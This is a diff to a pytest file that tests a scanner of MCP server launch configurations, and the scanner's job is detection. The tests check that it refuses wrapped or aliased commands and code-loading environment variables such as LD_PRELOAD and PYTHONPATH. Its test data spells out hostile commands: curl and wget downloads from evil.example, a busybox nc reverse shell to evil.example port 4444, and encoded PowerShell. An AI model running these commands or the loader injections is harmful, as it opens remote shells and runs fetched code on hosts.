@@ -69,7 +69,10 @@ def test_loader_environment_and_cwd_are_checked():
     assert config_findings(["srv"], env={"LD_PRELOAD": "/tmp/x.so"}) == ["loader_injection_env"]
     assert config_findings(["srv"], env={"DYLD_INSERT_LIBRARIES": "x"}) == ["loader_injection_env"]
     assert config_findings(["srv"], env={"NODE_OPTIONS": "--require /tmp/hook.js"}) == ["loader_injection_env"]
-    assert config_findings(["srv"], env={"NODE_OPTIONS": "--max-old-space-size=512"}) == []
+    # NODE_OPTIONS is code configuration (catalog._env_refused): refused whatever it holds.
+    assert config_findings(["srv"], env={"NODE_OPTIONS": "--max-old-space-size=512"}) == [
+        "loader_injection_env"]
+    assert config_findings(["srv"], env={"LOG_LEVEL": "debug"}) == []
     assert config_findings(["srv"], cwd="/etc/cron.daily") == ["persistence_path"]
     assert config_findings(None, headers={"X": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxyz123456789"}) == [
         "embedded_ssh_key"]
@@ -284,3 +287,69 @@ def test_long_result_spills_to_a_private_file(tmp_path):
 def test_without_a_server_nothing_spills(tmp_path):
     out = resources._bound_tool_result({"content": [{"type": "text", "text": "x" * 70_000}]})
     assert "full_text" not in out and len(out["content"][0]["text"]) == 70_000
+
+
+# ── review M2 (repro r1): wrappers, --flag=value, PowerShell aliases, code-loading env ──
+
+import shlex  # noqa: E402
+
+WRAPPED = {
+    "env_python_c": "/usr/bin/env python3 -c 'import urllib.request as u; u.urlopen(\"http://x\")'",
+    "timeout_bash_c": "timeout 9999 bash -c 'curl -s http://evil.example/x -o /tmp/x'",
+    "nice_sh_c": "nice -n 5 sh -c 'wget http://evil.example/x'",
+    "uv_run_python_c": "uv run python -c 'import socket'",
+    "node_eval_equals": "node --eval=require('https').get('https://evil.example')",
+    "pwsh_ec": "pwsh -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+    "busybox_wget": "busybox wget http://evil.example/x",
+    "busybox_nc": "busybox nc evil.example 4444 -e /bin/sh",
+    # further spellings found while fixing
+    "env_split_string": "env -S 'python3 -c \"import socket\"'",
+    "env_assign_then_wrap": "env A=1 nohup stdbuf -oL setsid bash -c 'curl http://e'",
+    "npx_node_eval": "npx -y node -e \"require('net').connect(1)\"",
+    "uvx_python_c": "uvx --from x python -c 'import socket'",
+    "uv_tool_run": "uv tool run python -c 'import socket'",
+    "python_glued_c": "python3 -c'import socket'",
+    "perl_glued_e": "perl -e'use IO::Socket'",
+    "pwsh_encodedarguments": "pwsh -EncodedArguments AAAA",
+    "pwsh_slash_command": "powershell.exe /Command Invoke-WebRequest https://e",
+    "pwsh_colon_command": "pwsh -c:iwr https://e",
+    "sudo": "sudo my-mcp-server",
+}
+
+
+@pytest.mark.parametrize("name", sorted(WRAPPED))
+def test_wrapped_or_aliased_launch_is_refused(name):
+    assert config_findings(shlex.split(WRAPPED[name])), name
+
+
+@pytest.mark.parametrize("cmd", [
+    "timeout 300 python -m my_mcp_server",
+    "env LOG_LEVEL=debug node /opt/srv/index.js",
+    "uv run --with mcp my-server --stdio",
+    "uvx mcp-server-git --repository /home/u/repo",
+    "npx -y @modelcontextprotocol/server-filesystem /home/u/projects",
+    "nice -n 10 docker run -i --rm mcp/fetch",
+    "node server.js --eval-mode fast",
+])
+def test_ordinary_wrapped_servers_pass(cmd):
+    assert config_findings(shlex.split(cmd)) == [], cmd
+
+
+CODE_ENV = {"PYTHONPATH": "/tmp/evil", "LD_LIBRARY_PATH": "/tmp/evil", "PYTHONHOME": "/tmp/evil",
+            "PERL5LIB": "/tmp/evil", "RUBYLIB": "/tmp/evil", "GCONV_PATH": "/tmp/evil",
+            "PATH": "/tmp/evil:/usr/bin", "NODE_PATH": "/tmp/evil"}
+
+
+@pytest.mark.parametrize("name", sorted(CODE_ENV))
+def test_code_loading_env_is_refused(name):
+    assert "loader_injection_env" in config_findings(["python3", "-m", "srv"], env={name: CODE_ENV[name]})
+
+
+def test_env_wrapper_assignments_are_checked_as_environment():
+    assert "loader_injection_env" in config_findings(
+        shlex.split("env LD_PRELOAD=/tmp/x.so my-server"))
+
+
+def test_node_options_inspect_is_refused():
+    assert "loader_injection_env" in config_findings(
+        ["node", "server.js"], env={"NODE_OPTIONS": "--inspect=0.0.0.0:9229"})
